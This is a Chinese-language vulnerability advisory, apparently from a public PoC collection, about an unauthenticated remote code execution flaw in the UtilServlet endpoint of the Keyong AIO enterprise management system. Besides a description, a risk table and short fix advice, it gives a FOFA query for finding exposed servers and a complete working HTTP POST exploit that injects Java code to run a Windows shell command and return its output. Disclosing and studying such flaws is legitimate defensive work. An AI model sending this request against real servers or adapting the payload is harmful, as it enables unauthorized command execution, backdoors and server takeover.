# 关于科荣 AIO 管理系统RCE漏洞预警

# 漏洞描述

科荣AIO 企业⼀体化管理解决⽅案 通过ERPERP（进销存财务）、OAOA（办公⾃动化）、CRMCRM（客⼾关系管理）、UDPUDP（⾃定义平台），集电⼦商务平台、⽀付平台、ERP 平台、微信平台、移动APP 等解决了众多企业客⼾在管理过程中跨部⻔、多功能、需求多变等通⽤及个性化的问题。AIO UtilServlet 接口处存远程代码执行漏洞，未经身份验证的攻击者可通过该漏洞远程执行恶意代码，写入后门文件，可获取服务器权限。

# 影响范围

科荣 AIO 管理系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="changeAccount('8000')"

POC/EXP：

POST /UtilServlet HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 326

operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field


# 修复方案

**官方修复：**

关闭互联网暴露面或接口设置访问权限

升级至安全版本

关注官方发布的最新修复建议。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
